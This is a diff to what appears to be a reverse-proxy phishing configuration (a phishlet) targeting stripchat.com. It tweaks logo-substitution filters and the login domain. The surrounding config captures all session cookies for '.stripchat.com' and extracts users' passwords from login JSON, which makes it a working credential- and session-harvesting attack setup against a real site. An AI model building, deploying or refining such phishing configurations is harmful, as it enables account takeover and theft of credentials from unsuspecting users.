@@ -6,7 +6,7 @@ sub_filters:
 # Replace client's logo with Stripchat's
  - {triggers_on: 'stripchat.com', orig_sub: 'www', domain: 'stripchat.com', search: '"logoURL":"([^"]*)', replace: '"logoURL":"', mimes: ['text/html', 'application/json', 'application/x-javascript']}
 # Replace logo with clients
- - {triggers_on: 'stripchat.com', orig_sub: 'www', domain: 'stripchat.com', search: '"logoURL":"([^"]*)', replace: '"logoURL":"https://example.com/client_logo.png', mimes: ['text/html', 'application/json', 'application/x-javascript', 'application/javascript']}
+# - {triggers_on: 'stripchat.com', orig_sub: 'www', domain: 'stripchat.com', search: '"logoURL":"([^"]*)', replace: '"logoURL":"https://example.com/client_logo.png', mimes: ['text/html', 'application/json', 'application/x-javascript', 'application/javascript']}
 auth_tokens:
   - domain: '.stripchat.com'
     keys: ['.*,regexp']
@@ -22,7 +22,7 @@ credentials:
     search: '"password":"([^"]*)"'
     type: 'json'
 login:
-  domain: 'stripchat.com'
+  domain: 'www.stripchat.com'
   path: '/login'
 # Handle redirect issue, only login page will have three buttons.
 # Hook Sign In button to redirect after they click it, keep checking for
